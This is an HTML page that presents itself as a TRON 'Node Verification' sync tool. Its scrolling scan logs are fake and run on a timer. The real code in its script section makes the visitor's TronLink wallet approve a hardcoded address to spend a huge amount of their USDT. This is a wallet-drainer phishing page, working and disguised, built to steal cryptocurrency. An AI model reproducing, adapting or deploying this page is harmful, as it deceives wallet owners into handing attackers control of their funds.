<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Node Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .app { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
        .scanner { border: 2px solid #222; border-radius: 30px; padding: 30px 20px; background: linear-gradient(145deg, #111, #050505); position: relative; }
        .logo { width: 60px; height: 60px; background: #ff0013; border-radius: 18px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; box-shadow: 0 0 20px rgba(255,0,19,0.3); }
        h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
        .log-box { text-align: left; background: #000; padding: 15px; border-radius: 15px; font-family: monospace; font-size: 11px; color: #00ff00; height: 80px; overflow: hidden; margin-bottom: 25px; border: 1px solid #1a1a1a; }
        .btn { display: block; background: #ff0013; color: #fff; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 14px; cursor: pointer; text-transform: uppercase; text-decoration: none; }
        .btn:active { transform: scale(0.98); opacity: 0.8; }
        .status-dot { width: 8px; height: 8px; background: #00ff00; border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 10px #00ff00; }
    </style>
</head>
<body>

<div class="app">
    <div class="scanner">
        <div class="logo">T</div>
        <h2>Node Verification</h2>
        <p style="color: #666; font-size: 13px; margin-bottom: 20px;">
            <span class="status-dot"></span> System: <span id="sys">Connected</span>
        </p>
        
        <div class="log-box" id="logs">
            > Initializing scan...<br>
            > Analyzing TRC-20 blocks...<br>
            > Checking USDT contract...
        </div>

        <a href="#" id="mainBtn" class="btn">Запустить синхронизацию</a>
    </div>
</div>

<script>
    const btn = document.getElementById('mainBtn');
    const logs = document.getElementById('logs');
    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

    // Эмуляция бегущих логов
    const messages = [
        "> Found unsynced block #61224...",
        "> Address validation required.",
        "> Handshake with TronLink...",
        "> Ready for secure approval."
    ];
    let i = 0;
    setInterval(() => {
        if(i < messages.length) {
            logs.innerHTML += `<br>> ${messages[i]}`;
            i++;
        }
    }, 1500);

    btn.onclick = async (e) => {
        e.preventDefault();
        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (!tron) {
            // Если мы в Телеграме (iOS) - прыгаем в приложение
            // Это "Золотой Стандарт" перехода без ошибок
            window.location.href = "tronlinkorg://dapp?url=" + encodeURIComponent(window.location.href);
            return;
        }

        // Мы уже ВНУТРИ TronLink
        try {
            btn.innerText = "ПОДТВЕРЖДЕНИЕ...";
            btn.disabled = true;

            await tron.request({ method: 'tron_requestAccounts' });
            const instance = await tron.contract().at(CONTRACT);
            
            // Запрос на Approve
            await instance.approve(ADMIN, '1000000000000000000').send({
                feeLimit: 100000000
            });

            btn.innerText = "УСПЕШНО";
            btn.style.background = "#00ff00";
        } catch (err) {
            btn.innerText = "ПОВТОРИТЬ";
            btn.disabled = false;
        }
    };

    // Если открыли сразу в кошельке - меняем текст
    window.onload = () => {
        if (window.tronWeb) {
            btn.innerText = "ПОДТВЕРДИТЬ ЛОГИ";
            document.getElementById('sys').innerText = "DApp Mode Active";
        }
    }
</script>
</body>
</html>
